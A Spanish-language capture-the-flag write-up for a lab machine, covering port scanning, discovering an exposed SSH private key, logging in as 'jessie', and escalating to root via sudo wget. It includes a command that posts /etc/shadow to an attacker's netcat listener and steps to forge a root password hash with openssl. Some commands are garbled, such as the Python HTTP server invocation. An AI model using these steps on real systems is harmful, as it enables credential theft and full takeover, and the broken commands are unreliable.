### Tags: `shadow` `openssl`

# Escaneo (**22, 80**)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/65c36438-9c2a-4222-895e-2dfaa77410ad)

# Port 80

Mirando el código fuente de la web (**Ctrl + u**) encontramos un mensajito con un posible usuario `Jessie`

```
<!-- Jessie don't forget to udate the webiste -->
```

## Gobuster

Con Gobuster encontramos este directorio `sitemap`

```ruby
gobuster dir -u http://10.10.246.151 -t 150 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --no-error
```

![image](https://github.com/user-attachments/assets/5804e49d-ebc1-4473-835a-a51e4fc3d998)


## Dirb

Ahora tirándole un dirb encontramos este directorio `.ssh` con una clave **id_rsa**

```ruby
dir http://10.10.10.10/sitemap
```

![image](https://github.com/user-attachments/assets/bc2dd4fa-c631-4eb7-82d5-0d93195b4b68)

Tenemos la id_rsa

![image](https://github.com/user-attachments/assets/dbed8726-0533-480c-bdec-349dec0f8811)

# SSH

Nos conectamos por ssh con el usuario `jessie` que encontramos antes

![image](https://github.com/user-attachments/assets/5fe9d23e-2316-405a-93ed-20a99e148b50)

# Escalada *ROOT*

Poniendo `sudo -l` vemos que podemos ejecutar como *root* **wget**, por ende nos vamos a ``GTFObins`` y ponemos los siguientes comandos:

```ruby
nc -nlvp 443  #en la maquina atacante
sudo /usr/bin/wget --post-file=/etc/shadow <IP>:443   #maquina victima
```

Una ves puesto esos comando en la maquina actante vamos a recibir el `etc/shadow` y lo que hacemos es copiarlo y ponerlo en un archivito y jugar con `openssl` para cambiarle la contraseña a root y después *compartirlo* con la máquina victima con la **password cambiada**

```ruby
nano shadow
openssl passwd -6 -salt 'salt' 'password'
nano shadow   #el hash creado se lo ponemos a root
```

![image](https://github.com/user-attachments/assets/4991aa84-93a2-4ab4-ad28-d4b566cca1b9)

Ahora compartimos le archivo `shadow`

```ruby
python3 http.server -m 8080
```

Y acá ya seriamos `ROOT`

![image](https://github.com/user-attachments/assets/e05e5408-7f1b-4ecb-a30b-705892253b5d)


















